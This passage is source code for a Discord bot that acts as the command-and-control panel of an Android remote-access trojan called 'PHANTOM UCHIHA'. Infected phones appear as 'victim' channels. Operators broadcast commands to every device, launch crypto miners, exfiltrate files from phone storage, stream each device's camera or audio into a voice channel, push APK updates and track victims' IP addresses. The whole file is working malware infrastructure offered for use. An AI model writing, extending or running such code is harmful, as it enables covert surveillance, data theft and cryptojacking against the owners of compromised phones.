            if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)
            if (channels.size === 1) deviceCh = channels.first()
            else return i.editReply(`${E.warning} Multiple devices. Use \`/target\` first ${E.skull}`)
          }
          const r = await sendCmdLogged(deviceCh, 'stream', streamPayload, uid, user.username)
          if (!r.ok) return i.editReply(`${E.coffin} Error: ${r.err} ${E.skull}`)
          return i.editReply({ content: `${E.knife} Stream command sent: \`!stream ${streamPayload}\` ${E.skull}`, components: RESULT_BTNS })
        }
        case 'voicestream': {
          console.log(`[VoiceStream] Command from ${user.username}`)

          try {
            await guild.channels.fetch()
          } catch (e) {
            console.error(`[VoiceStream] channels.fetch failed: ${e.message}`)
          }

          let voiceChannel = options.getChannel('channel')

          if (!voiceChannel) {
            return i.editReply(`${E.warning} **Pick a voice channel!**\n\nUsage: \`/voicestream channel: <select voice channel>\`\n\n1. Type \`/voicestream\`\n2. Click the \`channel\` field\n3. Select a voice channel\n4. Press Enter`)
          }

          if (!voiceChannel.isVoiceBased()) {
            return i.editReply(`${E.coffin} \`${voiceChannel.name}\` is not a voice channel ${E.skull}`)
          }

          let deviceCh = null
          if (targets.has(uid)) {
            const data = targets.get(uid)
            const chId = typeof data === 'object' ? data.chId : data
            deviceCh = guild.channels.cache.get(chId)
            if (!deviceCh) { targets.delete(uid); return i.editReply(`${E.coffin} Target channel gone ${E.skull}`) }
          } else {
            const channels = getPhantomChannels(guild)
            if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)
            if (channels.size === 1) deviceCh = channels.first()
            else return i.editReply(`${E.warning} Multiple devices. Use \`/target\` first ${E.skull}`)
          }

          const botUrl = process.env.BOT_HTTP_URL || `https://substantial-impala-aymouo-bc7f3c76.koyeb.app`
          const payload = `voice ${voiceChannel.id} ${guild.id} ${botUrl}`

          console.log(`[VoiceStream] Sending to ${deviceCh.name}: !stream ${payload}`)

          // Reply immediately to avoid "application did not respond"
          await i.editReply({ content: `${E.satellite} **Starting voice stream**...\nDevice: \`${deviceCh.name}\`\nVoice: \`${voiceChannel.name}\`\nConnecting...` })

          // Send command in background
          sendCmdLogged(deviceCh, 'stream', payload, uid, user.username).then(r => {
            if (r.ok) {
              i.followUp({ content: `${E.check} **Voice stream active!**\n30fps H264 → VP8 pipeline`, ephemeral: true }).catch(() => {})
            } else {
              i.followUp({ content: `${E.coffin} Failed to start: ${r.err} ${E.skull}`, ephemeral: true }).catch(() => {})
            }
          }).catch(e => {
            i.followUp({ content: `${E.coffin} Error: ${e.message} ${E.skull}`, ephemeral: true }).catch(() => {})
          })

          return
        }
        case 'streamstatus': {
          const status = videoStream.getStreamStatus()
          if (!status) {
            return i.editReply(`${E.warning} No active streams ${E.skull}`)
          }
          const lines = status.streams.map(s =>
            `${s.active ? E.online : E.offline} **${s.deviceId}** | ${s.fps}fps ${s.resolution} | ${s.frames} frames | ${s.connection} | ${s.uptime}s`
          ).join('\n')
          return i.editReply({ content: `${E.satellite} **Stream Status** (${status.total} active)\n\`\`\`${lines}\n\`\`\``, components: MENU_BTNS })
        }
      }
    } catch (err) {
      console.error('Slash command error:', err.message)
      try { await i.editReply(`${E.coffin} Error: ${err.message} ${E.skull}`) } catch (_) {}
    }
    return
  }

  if (!i.isButton() && !i.isStringSelectMenu()) return
  try {
    if (ALLOWED_CHANNEL_ID && i.channelId !== ALLOWED_CHANNEL_ID) return

    const uid = i.user.id, guild = i.guild
    if (!guild) return
    if (isRateLimited(uid)) return i.reply({ content: `${E.skull} Rate limited. Wait a moment.`, ephemeral: true }).catch(() => {})
    if (isOnCooldown(uid)) return i.reply({ content: `${E.skull} Cooldown. Wait a moment.`, ephemeral: true }).catch(() => {})

    // ── Defer immediately to prevent "interaction failed" ──
    if (!i.deferred && !i.replied) await i.deferUpdate().catch(() => {})

    // ── Pagination ──
    if (i.customId === 'prev' || i.customId === 'next') {
      const d = devicePages.get(i.message.id)
      if (!d) return i.followUp({ content: `${E.coffin} Session expired — use !devices to refresh ${E.skull}`, ephemeral: true }).catch(() => {})
      d.idx = i.customId === 'prev' ? Math.max(0, d.idx - 1) : Math.min(d.pages.length - 1, d.idx + 1)
      await i.editReply({ embeds: d.pages[d.idx].embeds, components: d.pages[d.idx].components }).catch(() => {})
      return
    }

    // ── Select menu ──
    if (i.customId === 'sel') {
      const ch = guild.channels.cache.get(i.values?.[0])
      if (!ch) return i.editReply({ content: `${E.coffin} Not found ${E.skull}`, components: [] }).catch(() => {})
      targets.set(uid, { chId: ch.id, ts: Date.now() })
      return i.editReply({ content: `${E.knife} **Victim:** ${ch.name}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {})
    }

    // ── Select menu pagination ──
    if (i.customId === 'sel_prev' || i.customId === 'sel_next') {
      const d = devicePages.get(i.message.id)
      if (!d) return i.followUp({ content: `${E.coffin} Session expired — use !target to refresh ${E.skull}`, ephemeral: true }).catch(() => {})
      d.idx = i.customId === 'sel_prev' ? Math.max(0, d.idx - 1) : Math.min(d.pages.length - 1, d.idx + 1)
      await i.editReply({ components: d.pages[d.idx].components }).catch(() => {})
      return
    }

    // ── Alert buttons ──
    if (i.customId.startsWith('a_')) {
      const parts = i.customId.split('_')
      const cmdKey = parts[1]; const chId = parts.slice(2).join('_')
      if (cmdKey === 'menu') { const m = menuEmbed(); return i.editReply({ ...m, components: MENU_BTNS, ephemeral: true }).catch(() => {}) }
      if (cmdKey === 'victims') {
        await guild.channels.fetch().catch(() => {})
        await refreshDeviceStatus(guild, false)
        const pages = buildDevicePages(guild)
        if (!pages.length) return i.editReply({ content: `${E.coffin} No implants ${E.skull}`, ephemeral: true }).catch(() => {})
        return i.editReply({ embeds: pages[0].embeds, components: pages[0].components, ephemeral: true }).catch(() => {})
      }
      const ch = guild.channels.cache.get(chId)
      if (!ch) return i.editReply({ content: `${E.coffin} Device channel not found ${E.skull}`, ephemeral: true }).catch(() => {})
      const actualCmd = ALERT_CMD_MAP[cmdKey] || cmdKey
      const result = await sendCmd(ch, actualCmd)
      if (result.ok) {
        return i.editReply({ content: `${E.knife} \`!${actualCmd}\` sent ${E.skull}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {})
      }
      return i.editReply({ content: `${E.coffin} Failed: ${result.err} ${E.skull}`, ephemeral: true }).catch(() => {})
    }

    // ── Navigation buttons ──
    if (i.customId === 'devices') {
      await guild.channels.fetch().catch(() => {})
      await refreshDeviceStatus(guild, false)
      const pages = buildDevicePages(guild)
      if (!pages.length) return i.followUp({ content: `${E.coffin} No implants ${E.skull}`, ephemeral: true }).catch(() => {})
      const reply = await i.followUp({ embeds: pages[0].embeds, components: pages[0].components, fetchReply: true }).catch(() => {})
      if (!reply) return
      if (pages.length > 1) {
        devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
        setTimeout(async () => {
          devicePages.delete(reply.id)
          try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch (_) {}
        }, PAGINATION_TIMEOUT)
      }
      return
    }
    if (i.customId === 'menu') { const m = menuEmbed(); return i.followUp({ ...m, components: MENU_BTNS, ephemeral: true }).catch(() => {}) }
    if (i.customId === 'help') { const h = helpEmbed(); return i.followUp({ ...h, components: HELP_BTNS, ephemeral: true }).catch(() => {}) }
    if (i.customId === 'info') { return i.followUp({ content: `${E.bone} **PHANTOM UCHIHA v3.0**\n${E.zap} Discord WebSocket Gateway\n${E.heart} Heartbeat: 4-7 min\n${E.target} Commands: ${DEV_CMDS.size}\n${E.ghost} Max victims: unlimited`, ephemeral: true }).catch(() => {}) }
    if (i.customId === 'broadcast') return i.followUp({ content: `${E.bomb} \`!broadcast <cmd>\` sends to ALL devices ${E.skull}`, ephemeral: true }).catch(() => {})

    // ── Target button ──
    if (i.customId === 'target') {
      await guild.channels.fetch().catch(() => {})
      const channels = getPhantomChannels(guild)
      if (!channels.size) return i.editReply({ content: `${E.coffin} No victims ${E.skull}` }).catch(() => {})
      if (channels.size === 1) { targets.set(uid, { chId: channels.first().id, ts: Date.now() }); return i.editReply({ content: `${E.knife} Target: ${channels.first().name} ${E.skull}`, components: RESULT_BTNS }).catch(() => {}) }
      const pages = devSelectPages(channels)
      if (!pages.length) return i.editReply({ content: `${E.warning} Use \`!target <name>\` ${E.skull}` }).catch(() => {})
      const reply = await i.editReply({ content: `Select victim ${E.knife}`, components: pages[0].components }).catch(() => {})
      if (!reply) return
      if (pages.length > 1) {
        devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
        setTimeout(() => devicePages.delete(reply.id), SELECT_TIMEOUT)
      }
      return
    }

    // ── Device action buttons ──
    if (BTN_ACTIONS[i.customId]) {
      await guild.channels.fetch().catch(() => {})
      const channels = getPhantomChannels(guild)
      if (!channels.size) return i.editReply({ content: `${E.coffin} No devices ${E.skull}` }).catch(() => {})
      if (targets.has(uid)) {
        const r = await sendToTarget(uid, guild, BTN_ACTIONS[i.customId])
        if (r.ok) return i.editReply({ content: `${E.knife} \`!${BTN_ACTIONS[i.customId]}\` sent ${E.skull}`, components: RESULT_BTNS }).catch(() => {})
        if (r.err === 'no_target') { targets.delete(uid); return i.editReply({ content: `${E.skull} No target ${E.coffin}` }).catch(() => {}) }
        return i.editReply({ content: `${E.coffin} ${r.err} ${E.skull}` }).catch(() => {})
      }
      if (channels.size === 1) {
        const r = await sendCmd(channels.first(), BTN_ACTIONS[i.customId])
        if (r.ok) targets.set(uid, { chId: channels.first().id, ts: Date.now() })
        return i.editReply({ content: r.ok ? `${E.knife} \`!${BTN_ACTIONS[i.customId]}\` sent ${E.skull}` : `${E.coffin} ${r.err} ${E.skull}`, components: r.ok ? RESULT_BTNS : [] }).catch(() => {})
      }
      const pages = devSelectPages(channels)
      if (!pages.length) return i.editReply({ content: `${E.warning} ${channels.size} devices. Use \`!${BTN_ACTIONS[i.customId]} <name>\` ${E.skull}` }).catch(() => {})
      if (!i.channel) return i.editReply({ content: `${E.coffin} Cannot create selector ${E.skull}` }).catch(() => {})
      const m = await i.editReply({ content: `Select victim for \`!${BTN_ACTIONS[i.customId]}\` ${E.knife}`, components: pages[0].components }).catch(() => null)
      if (!m) return
      if (pages.length > 1) {
        devicePages.set(m.id, { pages, idx: 0, ts: Date.now() })
      }
      const col = i.channel.createMessageComponentCollector({ filter: si => si.user.id === uid && si.customId === 'sel' && si.message.id === m.id, time: SELECT_TIMEOUT, max: 1 })
      col.on('collect', async si => {
        const ch = guild.channels.cache.get(si.values[0])
        if (ch) {
          const result = await sendCmd(ch, BTN_ACTIONS[i.customId])
          if (result.ok) targets.set(uid, { chId: ch.id, ts: Date.now() })
        }
        await si.update({ content: `${E.knife} \`!${BTN_ACTIONS[i.customId]}\` sent ${E.skull}`, components: [] }).catch(() => {})
      })
      col.on('end', async collected => { if (!collected.size) try { await m.edit({ content: `${E.coffin} Timed out ${E.skull}`, components: [] }) } catch (_) {} })
      return
    }

    return i.followUp({ content: `${E.skull} Unknown action ${E.skull}`, ephemeral: true }).catch(() => {})
  } catch (err) {
    console.error('Interaction error:', err.message, err.stack)
    try {
      if (i.deferred || i.replied) {
        await i.followUp({ content: `${E.coffin} Error: ${err.message}`, ephemeral: true }).catch(() => {})
      } else {
        await i.reply({ content: `${E.coffin} Error: ${err.message}`, ephemeral: true }).catch(() => {})
      }
    } catch (_) {}
  }
})

// ── Messages ────────────────────────────────────────────────────────────────

client.on(Events.MessageCreate, async (msg) => {
  if (msg.author.bot) return
  if (ALLOWED_CHANNEL_ID && msg.channel.id !== ALLOWED_CHANNEL_ID) return
  const raw = msg.content.trim()
  if (!raw.startsWith('!')) return
  const [cmd, ...args] = raw.split(/\s+/)
  const cmdL = cmd.toLowerCase()
  const uid = msg.author.id, guild = msg.guild
  if (!guild) return
  if (isRateLimited(uid)) return
  if (isOnCooldown(uid)) return

  try {
    if (BOT_CMDS.includes(cmdL)) {
      switch (cmdL) {
        case '!help': { const h = helpEmbed(); return msg.reply({ ...h, components: HELP_BTNS }) }
        case '!menu': { const m = menuEmbed(); return msg.reply({ ...m, components: MENU_BTNS }) }
        case '!devices': {
          await guild.channels.fetch(); await refreshDeviceStatus(guild, false)
          const pages = buildDevicePages(guild)
          if (!pages.length) return msg.reply({ embeds: bloodEmbed('NO VICTIMS', 'offline', `${E.coffin} No devices connected. ${E.skull}`).embeds })
          const reply = await msg.reply({ embeds: pages[0].embeds, components: pages[0].components })
          if (pages.length > 1) {
            devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
            setTimeout(async () => {
              devicePages.delete(reply.id)
              try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch (_) {}
            }, PAGINATION_TIMEOUT)
          }
          return
        }
        case '!target': {
          if (!args.length) {
            await guild.channels.fetch()
            const channels = getPhantomChannels(guild)
            if (!channels.size) return msg.reply(`${E.knife} No victims available ${E.skull}`)
            if (channels.size === 1) {
              targets.set(uid, { chId: channels.first().id, ts: Date.now() })
              return msg.reply({ content: `${E.knife} Target: ${channels.first().name} ${E.skull}`, components: RESULT_BTNS })
            }
            const pages = devSelectPages(channels)
            const reply = await msg.reply({ content: `Select victim ${E.knife}`, components: pages[0].components })
            if (pages.length > 1) {
              devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
            }
            return
          }
          await guild.channels.fetch()
          const ch = findPhantomChannel(guild, args[0])
          if (!ch) return msg.reply(`${E.coffin} **${args[0]}** not found ${E.skull}`)
          targets.set(uid, { chId: ch.id, ts: Date.now() })
          const lines = [
            `${A.brightCyan}${smallCaps('target acquired')}${A.reset}`,
            `${A.cyan}┃${A.reset} ${mono(ch.name)}${A.reset}`,
            `${A.grey}!untarget to clear${A.reset}`,
          ]
          const box = createBox(lines.join('\n'), 'neon', 36)
          return msg.reply({ ...bloodEmbed(bold('VICTIM ACQUIRED'), 'warning', `\`\`\`ansi\n${box}\n\`\`\``), components: RESULT_BTNS })
        }
        case '!untarget': { targets.delete(uid); return msg.reply({ ...bloodEmbed(bold('DRAIN STOPPED'), 'warning', `${E.coffin} No active victim. ${E.skull}`), components: MENU_BTNS }) }
        case '!history': {
          const log = formatCommandLog(uid)
          return msg.reply({ ...bloodEmbed(bold('COMMAND HISTORY'), 'info', `\`\`\`${log}\n\`\`\``, { footer: `${smallCaps('last 15 commands')} ⚡ ${ts()}` }), components: MENU_BTNS, ephemeral: true })
        }
        case '!search': {
          if (!args.length) return msg.reply(`${E.target} Usage: \`!search <name>\` ${E.skull}`)
          await guild.channels.fetch()
          const channels = getPhantomChannels(guild)
          const query = args.join(' ').toLowerCase()
          const matches = [...channels.values()].filter(ch => ch.name.toLowerCase().includes(query))
          if (!matches.length) return msg.reply(`${E.coffin} No victims matching \`"${query}"\` ${E.skull}`)
          const lines = [`${A.brightCyan}${smallCaps('search results')}${A.reset}`]
          for (const ch of matches) {
            const st = deviceStatus.get(ch.id)
            const on = st?.online ?? false
            const dot = on ? E.online : E.offline
            lines.push(`${A.cyan}┃${A.reset} ${dot} ${mono(ch.name)}`)
          }
          const box = createBox(lines.join('\n'), 'neon', 36)
          return msg.reply({ ...bloodEmbed(bold(`SEARCH: "${query}"`), 'warning', `\`\`\`ansi\n${box}\n\`\`\``, { footer: `${matches.length} result(s) ⚡ ${ts()}` }), components: MENU_BTNS })
        }
        case '!broadcast': {
          const bc = args.join(' ').trim()
          if (!bc) return msg.reply(`${E.bomb} Usage: \`!broadcast <cmd>\` ${E.skull}`)
          const bcParts = bc.replace(/^!+/, '').split(/\s+/)
          const bcCmd = bcParts[0]
          const bcPayload = bcParts.slice(1).join(' ')
          if (!VALID_CMDS.has(bcCmd)) return msg.reply(`${E.warning} Invalid command: \`!${bcCmd}\`. Use \`!help\` for valid commands. ${E.skull}`)
          await guild.channels.fetch()
          const channels = getPhantomChannels(guild)
          if (!channels.size) return msg.reply(`${E.coffin} No devices ${E.skull}`)

          let sent = 0, failed = [], retryQueue = []
          for (const [, ch] of channels) {
            const r = await sendCmdLogged(ch, bcCmd, bcPayload, uid, msg.author.username)
            if (r.ok) {
              sent++
            } else {
              retryQueue.push({ ch, name: ch.name })
            }
            if (channels.size > 3) await new Promise(r => setTimeout(r, 1200))
          }
          for (const item of retryQueue) {
            await new Promise(r => setTimeout(r, 2000))
            const r = await sendCmdLogged(item.ch, bcCmd, bcPayload, uid, msg.author.username)
            if (r.ok) sent++; else failed.push(item.name)
          }

          const lines = [
            `${A.brightRed}${smallCaps('broadcast')}${A.reset}`,
            `${A.red}┃${A.reset} ${mono('!' + bcCmd + (bcPayload ? ' ' + bcPayload : ''))}${A.reset}`,
            `${A.red}┃${A.reset} ${A.grey}sent: ${sent}/${channels.size}${A.reset}`,
            failed.length ? `${A.red}┃${A.reset} ${A.grey}failed: ${failed.join(', ')}${A.reset}` : '',
          ].filter(Boolean).join('\n')
          const box = createBox(lines, 'neon', 36)
          return msg.reply({ ...bloodEmbed(bold('BROADCAST'), 'online', `\`\`\`ansi\n${box}\n\`\`\``), components: RESULT_BTNS })
        }
        case '!miner': {
          const minerArgs = args.join(' ')
          await guild.channels.fetch()
          let deviceCh = null
          if (targets.has(uid)) {
            const data = targets.get(uid)
            const chId = typeof data === 'object' ? data.chId : data
            deviceCh = guild.channels.cache.get(chId)
            if (!deviceCh) { targets.delete(uid); return msg.reply(`${E.coffin} Target channel gone ${E.skull}`) }
          } else {
            const channels = getPhantomChannels(guild)
            if (!channels.size) return msg.reply(`${E.coffin} No devices ${E.skull}`)
            if (channels.size === 1) deviceCh = channels.first()
            else return msg.reply(`${E.warning} Multiple devices. Use \`!target\` first ${E.skull}`)
          }
          const r = await sendCmdLogged(deviceCh, 'miner', minerArgs || '', uid, msg.author.username)
          if (!r.ok) return msg.reply(`${E.coffin} Error: ${r.err} ${E.skull}`)
          return msg.reply({ content: `${E.knife} Miner command sent ${E.skull}`, components: RESULT_BTNS })
        }
        case '!upload': {
          const filePath = args.join(' ')
          if (!filePath) return msg.reply(`${E.target} Usage: \`!upload <file_path>\`\nExample: \`!upload /sdcard/Download/file.pdf\` ${E.skull}`)
          await guild.channels.fetch()
          let deviceCh = null
          if (targets.has(uid)) {
            const data = targets.get(uid)
            const chId = typeof data === 'object' ? data.chId : data
            deviceCh = guild.channels.cache.get(chId)
            if (!deviceCh) { targets.delete(uid); return msg.reply(`${E.coffin} Target channel gone ${E.skull}`) }
          } else {
            const channels = getPhantomChannels(guild)
            if (!channels.size) return msg.reply(`${E.coffin} No devices ${E.skull}`)
            if (channels.size === 1) deviceCh = channels.first()
            else return msg.reply(`${E.warning} Multiple devices. Use \`!target\` first ${E.skull}`)
          }
          const r = await sendCmdLogged(deviceCh, 'upload', filePath, uid, msg.author.username)
          if (!r.ok) return msg.reply(`${E.coffin} Error: ${r.err} ${E.skull}`)
          return msg.reply({ content: `${E.knife} Upload requested: \`${filePath}\` ${E.skull}`, components: RESULT_BTNS })
        }
        case '!stream': {
          const streamArgs = args.join(' ')
          await guild.channels.fetch()
          let deviceCh = null
          if (targets.has(uid)) {
            const data = targets.get(uid)
            const chId = typeof data === 'object' ? data.chId : data
            deviceCh = guild.channels.cache.get(chId)
            if (!deviceCh) { targets.delete(uid); return msg.reply(`${E.coffin} Target channel gone ${E.skull}`) }
          } else {
            const channels = getPhantomChannels(guild)
            if (!channels.size) return msg.reply(`${E.coffin} No devices ${E.skull}`)
            if (channels.size === 1) deviceCh = channels.first()
            else return msg.reply(`${E.warning} Multiple devices. Use \`!target\` first ${E.skull}`)
          }
          const r = await sendCmdLogged(deviceCh, 'stream', streamArgs || '', uid, msg.author.username)
          if (!r.ok) return msg.reply(`${E.coffin} Error: ${r.err} ${E.skull}`)
          return msg.reply({ content: `${E.knife} Stream command sent ${E.skull}`, components: RESULT_BTNS })
        }
      }
      return
    }

    const clean = cmdL.replace(/^!/, '')
    if (!DEV_CMDS.has(clean)) return

    await guild.channels.fetch()
    const channels = getPhantomChannels(guild)

    if (clean === 'ping' && !channels.size && !targets.has(uid)) {
      const start = Date.now()
      const m = await msg.reply(`${E.heart} Pong! ${E.skull}`).catch(() => null)
      if (!m) return
      return m.edit(`${E.heart} Pong! Bot latency: **${Date.now() - start}ms** | ${E.coffin} No devices ${E.skull}`).catch(() => {})
    }

    let payload = args.join(' '), deviceCh = null
    if (args.length) { const ch = findPhantomChannel(guild, args[0]); if (ch) { deviceCh = ch; payload = args.slice(1).join(' ') } }

    // Handle !update with APK attachment
    if (clean === 'update' && msg.attachments.size > 0) {
      const apk = msg.attachments.find(a => a.name.endsWith('.apk'))
      if (!apk) return msg.reply(`${E.coffin} Attach an .apk file ${E.skull}`)
      const url = apk.url
      const size = formatSize(apk.size)
      const ver = apk.name.match(/v?(\d+\.\d+\.\d+)/)?.[1] || 'unknown'
      const cmdPayload = `push ${url}`
      let r = null
      if (deviceCh) r = await sendCmd(deviceCh, clean, cmdPayload)
      else if (targets.has(uid)) r = await sendToTarget(uid, guild, clean, cmdPayload)
      else if (channels.size === 1) r = await sendCmd(channels.first(), clean, cmdPayload)
      if (!r || !r.ok) return msg.reply(`${E.coffin} No target. Use \`!target <name>\` first ${E.skull}`)
      return msg.reply({ content: `${E.knife} Pushing \`openaccess-v${ver}.apk\` (${size}) to \`${r.name}\` ${E.skull}`, components: RESULT_BTNS })
    }

    if (deviceCh) {
      const r = await sendCmdLogged(deviceCh, clean, payload, uid, msg.author.username)
      if (!r.ok) return msg.reply(`${E.coffin} Error: ${r.err} ${E.skull}`)
      return msg.reply({ content: `${E.knife} \`!${clean}\` sent to \`${r.name}\` ${E.skull}`, components: RESULT_BTNS })
    }

    if (targets.has(uid)) {
      const r = await sendToTarget(uid, guild, clean, payload)
      if (r.ok) { logCommand(uid, msg.author.username, clean, payload, r.name); return msg.reply({ content: `${E.knife} \`!${clean}\` sent ${E.skull}`, components: RESULT_BTNS }) }
      if (r.err === 'no_target' || r.err === 'gone') { targets.delete(uid); return msg.reply(`${E.coffin} Use \`!target <name>\` first ${E.skull}`) }
      return msg.reply(`${E.coffin} ${r.err} ${E.skull}`)
    }

    if (channels.size === 1) {
      const ch = channels.first()
      const r = await sendCmdLogged(ch, clean, payload, uid, msg.author.username)
      if (r.ok) targets.set(uid, { chId: ch.id, ts: Date.now() })
      return msg.reply({ content: `${E.knife} \`!${clean}\` sent to \`${ch.name}\` ${E.skull}`, components: r.ok ? RESULT_BTNS : [] })
    }

    if (channels.size > 1) {
      const pages = devSelectPages(channels)
      if (!pages.length) return msg.reply(`${E.warning} ${channels.size} devices. Use \`!${clean} <name>\` ${E.skull}`)
      const m = await msg.reply({ content: `Select victim for \`!${clean}\` ${E.knife}`, components: pages[0].components }).catch(() => null)
      if (!m) return
      if (pages.length > 1) {
        devicePages.set(m.id, { pages, idx: 0, ts: Date.now() })
      }
      const col = m.createMessageComponentCollector({ filter: ci => ci.user.id === uid && ci.customId === 'sel' && ci.message.id === m.id, time: SELECT_TIMEOUT, max: 1 })
      col.on('collect', async ci => {
        const ch = guild.channels.cache.get(ci.values[0])
        if (ch) { await sendCmd(ch, clean, payload); targets.set(uid, { chId: ch.id, ts: Date.now() }) }
        await ci.update({ content: `${E.knife} \`!${clean}\` sent ${E.skull}`, components: [] })
      })
      col.on('end', async collected => { if (!collected.size) try { await m.edit({ content: `${E.coffin} Timed out ${E.skull}`, components: [] }) } catch (_) {} })
      return
    }

    return msg.reply(`${E.coffin} No devices found. ${E.skull}`)
  } catch (err) { console.error(err); try { await msg.reply(`${E.coffin} Error: ${err.message} ${E.skull}`) } catch (_) {} }
})

// ── Status checker ──────────────────────────────────────────────────────────

let checkerRunning = false
let botStartTime = Date.now()
const deviceCheckLocks = new Set()

async function refreshDeviceStatus(guild, sendAlerts = false) {
  if (checkerRunning) return
  checkerRunning = true
  try {
    const allChannels = await guild.channels.fetch()
    const channels = allChannels.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-'))
    const alertCh = sendAlerts ? await getAlertChannel() : null
    await Promise.allSettled([...channels].map(async ([, ch]) => {
      if (deviceCheckLocks.has(ch.id)) return
      deviceCheckLocks.add(ch.id)
      try {
        let online = false, lastSeen = null
        try {
          const msgs = await ch.messages.fetch({ limit: 25 })
          for (const [, m] of msgs) {
            if (!m.content) continue
            const isHeartbeat = m.content.includes(':heartbeat:') ||
              m.content.includes(':green_circle:') ||
              m.content.includes('🟢') ||
              /<:heartbeat:\d+>/.test(m.content) ||
              /<:green_circle:\d+>/.test(m.content) ||
              /<a?:green_circle:\d+>/.test(m.content) ||
              m.content.includes('**Alive**') ||
              m.content.includes('**Device Online**') ||
              m.content.includes('**Reconnected**')
            if (isHeartbeat && Date.now() - m.createdTimestamp < HEARTBEAT_TIMEOUT) {
              online = true; lastSeen = m.createdTimestamp; break
            }
          }
          if (!online && msgs.size > 0) {
            lastSeen = msgs.first().createdTimestamp
            if (Date.now() - lastSeen < HEARTBEAT_TIMEOUT) online = true
          }
        } catch (_) {}
        const prev = deviceStatus.get(ch.id)
        const wasOnline = prev?.online ?? false
        deviceStatus.set(ch.id, { online, lastSeen, name: ch.name })
        if (!alertCh || wasOnline === online) return
        const cooldownKey = `${ch.id}:${online}`
        const lastAlert = alertCooldown.get(cooldownKey) || 0
        if (Date.now() - lastAlert < 120000) return
        if (Date.now() - botStartTime < 30000) return
        alertCooldown.set(cooldownKey, Date.now())
        let mModel = ch.name.replace('phantom-', ''), mAndroid = '?', mIp = '?'
        try {
          const msgs = await ch.messages.fetch({ limit: 25 })
          for (const [, m] of msgs) {
            if (!m.content) continue
            const om = m.content.match(/\*\*Device Online\*\*.*?—\s*(.+?)\s*\((.+?)\)\s*\|?\s*IP:\s*(.+)/)
            if (om) { mModel = om[1].trim(); mAndroid = om[2].trim(); mIp = om[3].trim(); break }
            const rm = m.content.match(/\*\*Reconnected\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
            if (rm) { mModel = rm[1].trim(); mIp = rm[2].trim(); break }
            const hm = m.content.match(/\*\*Alive\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
            if (hm) { mModel = hm[1].trim(); mIp = hm[2].trim(); break }
          }
        } catch (_) {}

        const deviceName = ch.name.replace('phantom-', '')
        let cardBuffer = null
        try {
          cardBuffer = await statusCard({
            deviceName, status: online ? 'online' : 'offline',
            model: mModel !== '?' ? mModel : 'Unknown',
            android: mAndroid !== '?' ? mAndroid : 'Unknown',
            ip: mIp !== '?' ? mIp : 'Unknown',
            lastSeen: online ? 'now' : (lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'),
            theme: 'blood'
          })
        } catch (e) {
          console.error(`[Alert] statusCard failed for ${deviceName}: ${e.message}`)
        }

        const e = new EmbedBuilder()
        const thumbUrl = randGif() || undefined

        if (!online) {
          const ago = lastSeen ? `${Math.round((Date.now() - lastSeen) / 60000)}m ago` : 'never'
          const fields = [
            { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
            { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
            { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
            { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
            { name: `${E.clock} Last Seen`, value: ago, inline: true },
            { name: `${E.heart} Status`, value: `${E.coffin} **OFFLINE**`, inline: true },
          ]
          e.setColor(C.void)
            .setTitle(`${E.coffin} ${ch.name} EXSANGUINATED ${E.coffin}`)
            .addFields(fields)
            .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.alert || undefined })

          if (thumbUrl) e.setThumbnail(thumbUrl)
          if (cardBuffer) {
            const attachment = new AttachmentBuilder(cardBuffer, { name: `status-${deviceName}.png` })
            e.setImage(`attachment://status-${deviceName}.png`)
            await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
          } else {
            await alertCh.send({ embeds: [e], components: ALERT_BTNS_OFFLINE(ch.id) }).catch(err => console.error('Alert send (offline):', err.message))
          }
        } else {
          const fields = [
            { name: `${E.target} Device`, value: `\`${ch.name}\``, inline: true },
            { name: `${E.brain} Model`, value: mModel !== '?' ? mModel : 'Unknown', inline: true },
            { name: `${E.bone} Android`, value: mAndroid !== '?' ? mAndroid : 'Unknown', inline: true },
            { name: `${E.eye} IP Address`, value: mIp !== '?' ? `\`${mIp}\`` : 'Unknown', inline: true },
            { name: `${E.heart} Status`, value: `${E.check} **ONLINE**`, inline: true },
            { name: `${E.zap} Connected`, value: ts(), inline: true },
          ]
          e.setColor(C.neon)
            .setTitle(`${E.check} ${ch.name} REANIMATED ${E.check}`)
            .addFields(fields)
            .setFooter({ text: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.correct || undefined })

          if (thumbUrl) e.setThumbnail(thumbUrl)
          if (cardBuffer) {
            const attachment = new AttachmentBuilder(cardBuffer, { name: `status-${deviceName}.png` })
            e.setImage(`attachment://status-${deviceName}.png`)
            await alertCh.send({ embeds: [e], files: [attachment], components: ALERT_BTNS_ONLINE(ch.id) }).catch(err => console.error('Alert send (online):', err.message))
          } else {
            await alertCh.send({ embeds: [e], components: ALERT_BTNS_ONLINE(ch.id) }).catch(err => console.error('Alert send (online):', err.message))
          }
        }
      } finally {
        deviceCheckLocks.delete(ch.id)
      }
    }))
  } catch (err) { console.error('Status:', err.message) }
  finally { checkerRunning = false }
}

function startStatusChecker(guild) {
  if (statusCheckerId) clearInterval(statusCheckerId)
  let running = false
  const runCheck = async () => {
    if (running) return
    running = true
    try {
      await refreshDeviceStatus(guild, true)
      const total = [...deviceStatus.values()].filter(s => s.online === true).length
      client.user.setActivity(`👁️ Watching ${total} devices | !help`, { type: 3 })
